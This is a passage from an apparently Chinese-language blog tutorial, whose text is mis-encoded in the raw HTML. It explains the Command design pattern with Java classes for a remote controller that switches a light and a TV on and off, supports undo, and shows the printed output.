å°†ä¸€ä¸ªæ¥å—è€…å¯¹è±¡ä¸ä¸€ä¸ªåŠ¨ä½œç»‘å®šï¼Œè°ƒç”¨æ¥å—è€…ç›¸åº”çš„æ“ä½œï¼Œå®ç° execute</p></li></ol><h2 id="å®ç°-11"><a class="markdownIt-Anchor" href="#å®ç°-11"></a> å®ç°</h2><p>æ™ºèƒ½ç”Ÿæ´»é¡¹ç›®éœ€æ±‚</p><p>çœ‹ä¸€ä¸ªå…·ä½“çš„éœ€æ±‚</p><ol><li><p>æˆ‘ä»¬ä¹°äº†ä¸€å¥—æ™ºèƒ½å®¶ç”µï¼Œæœ‰ç…§æ˜ç¯ã€é£æ‰‡ã€å†°ç®±ã€æ´—è¡£æœºï¼Œæˆ‘ä»¬åªè¦åœ¨æ‰‹æœºä¸Šå®‰è£… app å°±å¯ä»¥æ§åˆ¶å¯¹è¿™äº›å®¶ç”µå·¥ä½œã€‚</p></li><li><p>è¿™äº›æ™ºèƒ½å®¶ç”µæ¥è‡ªä¸åŒçš„å‚å®¶ï¼Œæˆ‘ä»¬ä¸æƒ³é’ˆå¯¹æ¯ä¸€ç§å®¶ç”µéƒ½å®‰è£…ä¸€ä¸ª Appï¼Œåˆ†åˆ«æ§åˆ¶ï¼Œæˆ‘ä»¬å¸Œæœ›åªè¦ä¸€ä¸ª appå°±å¯ä»¥æ§åˆ¶å…¨éƒ¨æ™ºèƒ½å®¶ç”µã€‚</p></li><li><p>è¦å®ç°ä¸€ä¸ª app æ§åˆ¶æ‰€æœ‰æ™ºèƒ½å®¶ç”µçš„éœ€è¦ï¼Œåˆ™æ¯ä¸ªæ™ºèƒ½å®¶ç”µå‚å®¶éƒ½è¦æä¾›ä¸€ä¸ªç»Ÿä¸€çš„æ¥å£ç»™ app è°ƒç”¨ï¼Œè¿™æ—¶ å°±å¯ä»¥è€ƒè™‘ä½¿ç”¨å‘½ä»¤æ¨¡å¼ã€‚</p></li><li><p>å‘½ä»¤æ¨¡å¼å¯å°†â€œåŠ¨ä½œçš„è¯·æ±‚è€…â€ä»â€œåŠ¨ä½œçš„æ‰§è¡Œè€…â€å¯¹è±¡ä¸­è§£è€¦å‡ºæ¥.</p></li><li><p>åœ¨æˆ‘ä»¬çš„ä¾‹å­ä¸­ï¼ŒåŠ¨ä½œçš„è¯·æ±‚è€…æ˜¯æ‰‹æœº appï¼ŒåŠ¨ä½œçš„æ‰§è¡Œè€…æ˜¯æ¯ä¸ªå‚å•†çš„ä¸€ä¸ªå®¶ç”µäº§å“</p></li></ol><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230103163835693.png" alt="image-20230103163835693" /></p><p><code>Client.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.command;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <br>      <span class="hljs-comment">//ä½¿ç”¨å‘½ä»¤è®¾è®¡æ¨¡å¼ï¼Œå®Œæˆé€šè¿‡é¥æ§å™¨ï¼Œå¯¹ç”µç¯çš„æ“ä½œ</span><br>      <br>      <span class="hljs-comment">//åˆ›å»ºç”µç¯çš„å¯¹è±¡(æ¥å—è€…)</span><br>      <span class="hljs-type">LightReceiver</span> <span class="hljs-variable">lightReceiver</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">LightReceiver</span>();<br>      <br>      <span class="hljs-comment">//åˆ›å»ºç”µç¯ç›¸å…³çš„å¼€å…³å‘½ä»¤</span><br>      <span class="hljs-type">LightOnCommand</span> <span class="hljs-variable">lightOnCommand</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">LightOnCommand</span>(lightReceiver);<br>      <span class="hljs-type">LightOffCommand</span> <span class="hljs-variable">lightOffCommand</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">LightOffCommand</span>(lightReceiver);<br>      <br>      <span class="hljs-comment">//éœ€è¦ä¸€ä¸ªé¥æ§å™¨</span><br>      <span class="hljs-type">RemoteController</span> <span class="hljs-variable">remoteController</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RemoteController</span>();<br>      <br>      <span class="hljs-comment">//ç»™æˆ‘ä»¬çš„é¥æ§å™¨è®¾ç½®å‘½ä»¤, æ¯”å¦‚ no = 0 æ˜¯ç”µç¯çš„å¼€å’Œå…³çš„æ“ä½œ</span><br>      remoteController.setCommand(<span class="hljs-number">0</span>, lightOnCommand, lightOffCommand);<br>      <br>      System.out.println(<span class="hljs-string">&quot;--------æŒ‰ä¸‹ç¯çš„å¼€æŒ‰é’®-----------&quot;</span>);<br>      remoteController.onButtonWasPushed(<span class="hljs-number">0</span>);<br>      System.out.println(<span class="hljs-string">&quot;--------æŒ‰ä¸‹ç¯çš„å…³æŒ‰é’®-----------&quot;</span>);<br>      remoteController.offButtonWasPushed(<span class="hljs-number">0</span>);<br>      System.out.println(<span class="hljs-string">&quot;--------æŒ‰ä¸‹æ’¤é”€æŒ‰é’®-----------&quot;</span>);<br>      remoteController.undoButtonWasPushed();<br>      <br>      <br>      System.out.println(<span class="hljs-string">&quot;=========ä½¿ç”¨é¥æ§å™¨æ“ä½œç”µè§†æœº==========&quot;</span>);<br>      <br>      <span class="hljs-type">TVReceiver</span> <span class="hljs-variable">tvReceiver</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TVReceiver</span>();<br>      <br>      <span class="hljs-type">TVOffCommand</span> <span class="hljs-variable">tvOffCommand</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TVOffCommand</span>(tvReceiver);<br>      <span class="hljs-type">TVOnCommand</span> <span class="hljs-variable">tvOnCommand</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TVOnCommand</span>(tvReceiver);<br>      <br>      <span class="hljs-comment">//ç»™æˆ‘ä»¬çš„é¥æ§å™¨è®¾ç½®å‘½ä»¤, æ¯”å¦‚ no = 1 æ˜¯ç”µè§†æœºçš„å¼€å’Œå…³çš„æ“ä½œ</span><br>      remoteController.setCommand(<span class="hljs-number">1</span>, tvOnCommand, tvOffCommand);<br>      <br>      System.out.println(<span class="hljs-string">&quot;--------æŒ‰ä¸‹ç”µè§†æœºçš„å¼€æŒ‰é’®-----------&quot;</span>);<br>      remoteController.onButtonWasPushed(<span class="hljs-number">1</span>);<br>      System.out.println(<span class="hljs-string">&quot;--------æŒ‰ä¸‹ç”µè§†æœºçš„å…³æŒ‰é’®-----------&quot;</span>);<br>      remoteController.offButtonWasPushed(<span class="hljs-number">1</span>);<br>      System.out.println(<span class="hljs-string">&quot;--------æŒ‰ä¸‹æ’¤é”€æŒ‰é’®-----------&quot;</span>);<br>      remoteController.undoButtonWasPushed();<br><br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>Command.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.command;<br><br><br><span class="hljs-comment">//åˆ›å»ºå‘½ä»¤æ¥å£</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Command</span> &#123;<br><br>   <span class="hljs-comment">//æ‰§è¡ŒåŠ¨ä½œ(æ“ä½œ)</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">execute</span><span class="hljs-params">()</span>;<br>   <span class="hljs-comment">//æ’¤é”€åŠ¨ä½œ(æ“ä½œ)</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">undo</span><span class="hljs-params">()</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>LightOffCommand.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.command;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LightOffCommand</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Command</span> &#123;<br><br>   <span class="hljs-comment">// èšåˆLightReceiver</span><br><br>   LightReceiver light;<br><br>   <span class="hljs-comment">// æ„é€ å™¨</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">LightOffCommand</span><span class="hljs-params">(LightReceiver light)</span> &#123;<br>         <span class="hljs-built_in">super</span>();<br>         <span class="hljs-built_in">this</span>.light = light;<br>      &#125;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">execute</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-comment">// è°ƒç”¨æ¥æ”¶è€…çš„æ–¹æ³•</span><br>      light.off();<br>   &#125;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">undo</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-comment">// è°ƒç”¨æ¥æ”¶è€…çš„æ–¹æ³•</span><br>      light.on();<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>LightOnCommand.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.command;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LightOnCommand</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Command</span> &#123;<br><br>   <span class="hljs-comment">//èšåˆLightReceiver</span><br>   <br>   LightReceiver light;<br>   <br>   <span class="hljs-comment">//æ„é€ å™¨</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">LightOnCommand</span><span class="hljs-params">(LightReceiver light)</span> &#123;<br>      <span class="hljs-built_in">super</span>();<br>      <span class="hljs-built_in">this</span>.light = light;<br>   &#125;<br>   <br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">execute</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-comment">//è°ƒç”¨æ¥æ”¶è€…çš„æ–¹æ³•</span><br>      light.on();<br>   &#125;<br><br>   <br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">undo</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-comment">//è°ƒç”¨æ¥æ”¶è€…çš„æ–¹æ³•</span><br>      light.off();<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>LightReceiver.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.command;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LightReceiver</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">on</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot; ç”µç¯æ‰“å¼€äº†.. &quot;</span>);<br>   &#125;<br>   <br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">off</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot; ç”µç¯å…³é—­äº†.. &quot;</span>);<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>NoCommand.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.command;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * æ²¡æœ‰ä»»ä½•å‘½ä»¤ï¼Œå³ç©ºæ‰§è¡Œ: ç”¨äºåˆå§‹åŒ–æ¯ä¸ªæŒ‰é’®, å½“è°ƒç”¨ç©ºå‘½ä»¤æ—¶ï¼Œå¯¹è±¡ä»€ä¹ˆéƒ½ä¸åš</span><br><span class="hljs-comment"> * å…¶å®ï¼Œè¿™æ ·æ˜¯ä¸€ç§è®¾è®¡æ¨¡å¼, å¯ä»¥çœæ‰å¯¹ç©ºåˆ¤æ–­</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> Administrator</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">NoCommand</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Command</span> &#123;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">execute</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <br>   &#125;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">undo</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>RemoteController.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.command;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RemoteController</span> &#123;<br><br>   <span class="hljs-comment">// å¼€ æŒ‰é’®çš„å‘½ä»¤æ•°ç»„</span><br>   Command[] onCommands;<br>   Command[] offCommands;<br><br>   <span class="hljs-comment">// æ‰§è¡Œæ’¤é”€çš„å‘½ä»¤</span><br>   Command undoCommand;<br><br>   <span class="hljs-comment">// æ„é€ å™¨ï¼Œå®Œæˆå¯¹æŒ‰é’®åˆå§‹åŒ–</span><br><br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">RemoteController</span><span class="hljs-params">()</span> &#123;<br><br>      onCommands = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Command</span>[<span class="hljs-number">5</span>];<br>      offCommands = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Command</span>[<span class="hljs-number">5</span>];<br><br>      <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5</span>; i++) &#123;<br>         onCommands[i] = <span class="hljs-keyword">new</span> <span class="hljs-title class_">NoCommand</span>();<br>         offCommands[i] = <span class="hljs-keyword">new</span> <span class="hljs-title class_">NoCommand</span>();<br>      &#125;<br>   &#125;<br><br>   <span class="hljs-comment">// ç»™æˆ‘ä»¬çš„æŒ‰é’®è®¾ç½®ä½ éœ€è¦çš„å‘½ä»¤</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setCommand</span><span class="hljs-params">(<span class="hljs-type">int</span> no, Command onCommand, Command offCommand)</span> &#123;<br>      onCommands[no] = onCommand;<br>      offCommands[no] = offCommand;<br>   &#125;<br><br>   <span class="hljs-comment">// æŒ‰ä¸‹å¼€æŒ‰é’®</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onButtonWasPushed</span><span class="hljs-params">(<span class="hljs-type">int</span> no)</span> &#123; <span class="hljs-comment">// no 0</span><br>      <span class="hljs-comment">// æ‰¾åˆ°ä½ æŒ‰ä¸‹çš„å¼€çš„æŒ‰é’®ï¼Œ å¹¶è°ƒç”¨å¯¹åº”æ–¹æ³•</span><br>      onCommands[no].execute();<br>      <span class="hljs-comment">// è®°å½•è¿™æ¬¡çš„æ“ä½œï¼Œç”¨äºæ’¤é”€</span><br>      undoCommand = onCommands[no];<br><br>   &#125;<br><br>   <span class="hljs-comment">// æŒ‰ä¸‹å¼€æŒ‰é’®</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">offButtonWasPushed</span><span class="hljs-params">(<span class="hljs-type">int</span> no)</span> &#123; <span class="hljs-comment">// no 0</span><br>      <span class="hljs-comment">// æ‰¾åˆ°ä½ æŒ‰ä¸‹çš„å…³çš„æŒ‰é’®ï¼Œ å¹¶è°ƒç”¨å¯¹åº”æ–¹æ³•</span><br>      offCommands[no].execute();<br>      <span class="hljs-comment">// è®°å½•è¿™æ¬¡çš„æ“ä½œï¼Œç”¨äºæ’¤é”€</span><br>      undoCommand = offCommands[no];<br><br>   &#125;<br>   <br>   <span class="hljs-comment">// æŒ‰ä¸‹æ’¤é”€æŒ‰é’®</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">undoButtonWasPushed</span><span class="hljs-params">()</span> &#123;<br>      undoCommand.undo();<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>TVOffCommand.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.command;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TVOffCommand</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Command</span> &#123;<br><br>   <span class="hljs-comment">// èšåˆTVReceiver</span><br><br>   TVReceiver tv;<br><br>   <span class="hljs-comment">// æ„é€ å™¨</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">TVOffCommand</span><span class="hljs-params">(TVReceiver tv)</span> &#123;<br>      <span class="hljs-built_in">super</span>();<br>      <span class="hljs-built_in">this</span>.tv = tv;<br>   &#125;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">execute</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-comment">// è°ƒç”¨æ¥æ”¶è€…çš„æ–¹æ³•</span><br>      tv.off();<br>   &#125;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">undo</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-comment">// è°ƒç”¨æ¥æ”¶è€…çš„æ–¹æ³•</span><br>      tv.on();<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>TVOnCommand.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.command;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TVOnCommand</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Command</span> &#123;<br><br>   <span class="hljs-comment">// èšåˆTVReceiver</span><br><br>   TVReceiver tv;<br><br>   <span class="hljs-comment">// æ„é€ å™¨</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">TVOnCommand</span><span class="hljs-params">(TVReceiver tv)</span> &#123;<br>      <span class="hljs-built_in">super</span>();<br>      <span class="hljs-built_in">this</span>.tv = tv;<br>   &#125;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">execute</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-comment">// è°ƒç”¨æ¥æ”¶è€…çš„æ–¹æ³•</span><br>      tv.on();<br>   &#125;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">undo</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-comment">// è°ƒç”¨æ¥æ”¶è€…çš„æ–¹æ³•</span><br>      tv.off();<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>TVReceiver.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.command;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TVReceiver</span> &#123;<br>   <br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">on</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot; ç”µè§†æœºæ‰“å¼€äº†.. &quot;</span>);<br>   &#125;<br>   <br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">off</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot; ç”µè§†æœºå…³é—­äº†.. &quot;</span>);<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>æ‰§è¡Œç¨‹åºï¼Œè¾“å‡ºç»“æœï¼š</p></blockquote><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs abnf">--------æŒ‰ä¸‹ç¯çš„å¼€æŒ‰é’®-----------<br> ç”µç¯æ‰“å¼€äº†.. <br>--------æŒ‰ä¸‹ç¯çš„å…³æŒ‰é’®-----------<br> ç”µç¯å…³é—­äº†.. <br>--------æŒ‰ä¸‹æ’¤é”€æŒ‰é’®-----------<br> ç”µç¯æ‰“å¼€äº†.. <br><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span>ä½¿ç”¨é¥æ§å™¨æ“ä½œç”µè§†æœº<span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><br>--------æŒ‰ä¸‹ç”µè§†æœºçš„å¼€æŒ‰é’®-----------<br> ç”µè§†æœºæ‰“å¼€äº†.. <br>--------æŒ‰ä¸‹ç”µè§†æœºçš„å…³æŒ‰é’®-----------<br> ç”µè§†æœºå…³é—­äº†.. <br>--------æŒ‰ä¸‹æ’¤é”€æŒ‰é’®-----------<br> ç”µè§†æœºæ‰“å¼€äº†..<br></code></pre></td></tr></table></figure><h2 id="å‘½ä»¤æ¨¡å¼çš„æ³¨æ„äº‹é¡¹å’Œç»†èŠ‚"><a class="markdownIt-Anchor" 